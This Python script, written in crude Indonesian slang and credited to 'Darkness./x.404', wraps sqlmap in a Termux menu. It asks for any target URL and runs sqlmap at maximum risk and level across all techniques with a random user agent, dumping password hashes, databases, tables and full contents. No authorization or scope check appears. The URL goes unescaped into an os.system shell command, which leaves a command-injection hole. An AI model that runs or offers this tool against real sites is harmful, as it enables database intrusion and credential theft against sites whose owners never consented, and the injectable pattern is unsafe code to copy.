import os
import time

# Warna ANSI
R = "\033[91m"  # Merah
G = "\033[92m"  # Hijau
Y = "\033[93m"  # Kuning
B = "\033[94m"  # Biru
P = "\033[95m"  # Ungu
C = "\033[96m"  # Cyan
W = "\033[0m"   # Reset

def bersih():
    os.system("clear")

def print_kz_logo():
    logo = f"""{C}

⣿⣧⣿⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣏⣿⣿
⣿⢸⣿⡏⣿⣿⣹⢸⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿
⣿⢼⡟⣤⣿⣧⣿⣸⣿⣿⣿⣿⣿⣿⣿⢻⣸⣿⢿⣿⣿⣿⣿⣿⣿⡇
⣿⢸⢧⣽⡼⣟⣛⣃⣿⠿⣿⣿⣿⣿⣿⢸⣏⣿⡘⣿⣿⣿⣿⡿⣿⢳
⣿⡜⣸⡿⠷⠿⢿⣿⡼⡟⣼⡿⣿⣿⡿⡼⣿⣞⣆⡄⢭⢟⣻⡇⡿⣾
⡜⣷⢻⣤⣿⡒⠄⠄⠉⣺⣿⣿⣾⣽⣇⣥⡯⠿⠾⣞⣮⣃⢻⣧⣇⣿
⣿⣮⡞⣷⣯⣗⣙⣿⣧⣣⣿⣿⣿⣿⣿⣿⣇⠟⡂⣀⣀⠉⡫⢸⣸⣿  {R}Author : Darkness./x.404{C}
⢿⣿⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣷⣬⣍⣎⣿⣿     tools : Sqlmap versi Gesek pelerrr
⣦⣭⣟⡿⣿⣿⣝⢿⣿⣿⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣼⣿⣿
⠋⠄⠄⠄⠄⠉⠻⢷⣝⡿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⣼⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⢙⢿⣮⡻⣿⣷⣿⣿⠿⣟⡯⢡⣾⣠⣿⣿⣿⣿

{W}"""
    bersih()
    print(logo)

def install_sqlmap():
    print(f"{C}Sabar tod, gw cek dulu udah terinstall atau belum SQLMap di Termux lu njing...{W}")
    cek = os.system("sqlmap --version > /dev/null 2>&1")

    if cek != 0:
        print(f"{R}SQLMap lu belom terinstall tod, yauda gw bantu install sabar ya...{W}")
        os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap")
        print(f"{G}WOY manusia, SQLMap lu udah gw installin nih tod!{W}")
    else:
        print(f"{G}SQLMap udah terinstall todd!{W}")

def sqlmap_proo_plerr():
    target = input(f"{P}Masukin target URL lu tod: {W}")
    if not target.strip():
        print(f"{R}Woy target ga boleh kosong lol{W}")
        time.sleep(2)
        return

    print(f"{R}Sedang ngocok pake SQLMap target {target}...{W}")

    sqlmap_command = f"""
    python3 sqlmap/sqlmap.py -u "{target}" \\
        --batch \\
        --risk=3 \\
        --level=5 \\
        --threads=10 \\
        --technique=BEUSTQ \\
        --random-agent \\
        --passwords \\
        --dbs \\
        --tables \\
        --columns \\
        --dump \\
        --cookie "your_cookie_here" \\
        --header "X-Your-Header: Value"
    """

    os.system(sqlmap_command)

def menu():
    print(f"{R}============================================{W}")
    print(f"{R}==================MENU PELER================{W}")
    print(f"{R}============================================{W}")
    print(f"{C}1 > SQLMap proo plerr{W}")
    print(f"{C}2 > Install SQLMap{W}")
    print(f"{C}3 > Exit{W}")
    print(f"{R}============================================{W}")

def main_menu():
    while True:
        bersih()
        print_kz_logo()
        menu()
        pilihan = input(f"{C}Pilih menu: {W}")

        if pilihan == "1":
            sqlmap_proo_plerr()
        elif pilihan == "2":
            install_sqlmap()
        elif pilihan == "3":
            print(f"{R}Keluar...{W}")
            break
        else:
            print(f"{R}Pilihan tidak valid!{W}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
